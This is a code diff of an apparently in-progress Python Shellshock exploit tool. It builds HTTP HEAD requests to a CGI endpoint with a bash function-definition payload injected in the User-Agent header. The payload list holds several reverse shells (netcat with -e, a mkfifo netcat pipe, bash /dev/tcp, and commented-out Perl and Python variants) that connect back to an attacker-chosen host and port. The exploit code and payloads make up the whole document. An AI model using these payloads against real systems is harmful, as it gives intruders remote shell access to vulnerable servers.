@@ -12,16 +12,25 @@ def shellshock_http_req(lhost, lport, rhost, rport, target_url):
    # The sendall function sends the data we need. It's needed to encode the variables before inserting otherwise they're treated like a string. Encoding the data helps with the data being sent as bytes
    rhost_encoded = rhost.encode() 
    lhost_encoded = lhost.encode()
-   #rev_payload = shellshock_rev_payloads(lhost_encoded, lport)
+   rev_payload = shellshock_rev_payloads(lhost_encoded, lport)
    #lport_encoded = lport.encode()
    #s.sendall(b"GET / HTTP1.1\r\nHost: 192.168.0.100\r\n\r\n")
    #s.sendall(b"GET / HTTP 1.1\r\nHost: %s\r\n\r\n" % rhost)
    #s.sendall(b"GET / HTTP 1.1\r\nHost: %s\r\n\r\n" % rhost_encoded)
    # This request requires appropriate encoding of each parameter which gets added and these parameters need to be placed into a tuple of their own in which you can then place more than one formatting argument
    #payload = s.sendall(b"HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc %s %d -e /bin/sh\r\nHost: %s\r\nConnection: close\r\n\r\n" % (lhost_encoded, lport, rhost_encoded))
-   payload = print(b"HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc %s %d -e /bin/sh\r\nHost: %s\r\nConnection: close\r\n\r\n" % (lhost_encoded, lport, rhost_encoded))
+   #payload = print(b"HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc %s %d -e /bin/sh\r\nHost: %s\r\nConnection: close\r\n\r\n" % (lhost_encoded, lport, rhost_encoded))
    # Proof of concept payload in which reverse payloads are arbitrary and not declared statically in the socket
    #payload = s.sendall(b"HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; %s\r\nHost: %s\r\nConnection: close\r\n\r\n" % (rev_payload, rhost_encoded))
+   for payloads in rev_payload:
+       # List containing all of the payloads
+       #print(rev_payload)
+       #print(payloads)
+       payloads_encoded = payloads.encode()
+       #payload = s.sendall(b"HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; %s\r\nHost: %s\r\nConnection: close\r\n\r\n" % (payloads, rhost_encoded))
+       #print(payloads)
+       # Need to send these bytes in a socket
+       payload = print(b"HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; %s\r\nHost: %s\r\nConnection: close\r\n\r\n" % (payloads_encoded, rhost_encoded))
    #payload = print(b"HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; %s\r\nHost: %s\r\nConnection: close\r\n\r\n" % (rev_payload, rhost_encoded))
    # Payload needs to be added in accordance with the for loop of several payloads. A single variable of payload should be expected which should fulfil the conditions of all required parameters as part of the HEAD request and user agent modification   
 
@@ -35,7 +44,7 @@ def shellshock_http_req(lhost, lport, rhost, rport, target_url):
    # Socket is closed
    #s.close()
 
-   return payload
+   #return payload
 ''' Paste in the URL from the shellshock_dect tool '''
 def shellshock_rev_payloads(lhost, lport):
 #def shellshock_rev_payloads(lhost, lport, target_url):
@@ -51,9 +60,13 @@ def shellshock_rev_payloads(lhost, lport):
     ''' New netcat '''
     reverse_payload_2 = "rm /tmp/f;mkfifo  /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc {} {}".format(lhost, lport)
     reverse_payload_3 = "bash -i >& /dev/tcp/{}/{} 0>&1".format(lhost, lport)
+    #reverse_payload_4 = "perl -e 'use Socket;$i="{}";$p={};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'".format(lhost, lport)
+    #reverse_payload_5 = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("111",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["\bin/sh","-i"]);'".format(lhost, lport)
     reverse_payloads.append(reverse_payload_1)
     reverse_payloads.append(reverse_payload_2)
     reverse_payloads.append(reverse_payload_3)
+    #reverse_payloads.append(reverse_payload_4)
+    #reverse_payloads.append(reverse_payload_5)
     #word_response = requests.get(target_url).status_code
     return reverse_payloads
 
